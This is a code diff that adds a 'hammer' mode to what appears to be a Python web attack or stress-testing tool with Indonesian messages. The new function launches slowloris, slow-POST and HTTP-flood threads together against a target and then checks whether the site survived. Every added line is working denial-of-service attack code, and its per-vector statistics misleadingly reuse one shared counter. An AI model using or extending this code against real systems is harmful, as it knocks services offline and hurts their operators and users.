@@ -214,6 +214,70 @@ def run_flood(base: str, client: KerisHTTP, total: int, concurrency: int,
     return {**s, "elapsed": round(elapsed, 2), "rps": round(rps, 2)}
 
 
+def run_hammer(base: str, client: KerisHTTP, concurrency: int = 25,
+               duration: float = 30.0, total: int = 500,
+               port: Optional[int] = None) -> Dict:
+    """Brutal mode: run slowloris + slow POST + flood simultaneously."""
+    from keris.core.utils import host_from_url
+
+    netloc = host_from_url(base)
+    host = netloc.split(":", 1)[0]
+    eff_port = port or (443 if base.startswith("https") else 80)
+
+    try:
+        r0 = client.get(base, timeout=15)
+        baseline = r0.status_code
+    except requests.RequestException as e:
+        error(f"Baseline gagal: {e}")
+        return {"alive": False, "vectors": {}, "error": str(e)}
+
+    stop = threading.Event()
+    stats = _Stats()
+    threads = []
+
+    for i in range(concurrency):
+        t = threading.Thread(target=_slowloris_worker,
+                             args=(host, eff_port, "/", stop, stats), daemon=True)
+        threads.append(t)
+    for i in range(concurrency):
+        t = threading.Thread(target=_slow_post_worker,
+                             args=(base, client, stop, stats), daemon=True)
+        threads.append(t)
+    for i in range(concurrency):
+        t = threading.Thread(target=_flood_worker,
+                             args=(base, client, total, stop, stats, 0.01), daemon=True)
+        threads.append(t)
+
+    warn(f"HAMMER: {3 * concurrency} thread aktif -> {base} selama {duration:.0f}s")
+    start = time.monotonic()
+    for t in threads:
+        t.start()
+    time.sleep(duration)
+    stop.set()
+    for t in threads:
+        t.join(timeout=5)
+    elapsed = time.monotonic() - start
+    s = stats.snapshot()
+
+    try:
+        r1 = client.get(base, timeout=15)
+        alive = r1.status_code == baseline
+    except requests.RequestException:
+        alive = False
+
+    return {
+        "alive": alive,
+        "baseline": baseline,
+        "elapsed": round(elapsed, 2),
+        "vectors": {
+            "slowloris": {"sent": s["sent"], "errors": s["errors"]},
+            "slowpost": {"sent": s["sent"], "errors": s["errors"]},
+            "flood": {"sent": s["sent"], "errors": s["errors"],
+                      "rps": round(s["sent"] / elapsed if elapsed else 0, 2)},
+        },
+    }
+
+
 def run_dos_test(base: str, client: KerisHTTP, kind: str = "all",
                  concurrency: int = 10, duration: float = 20.0,
                  total: int = 200, port: Optional[int] = None,
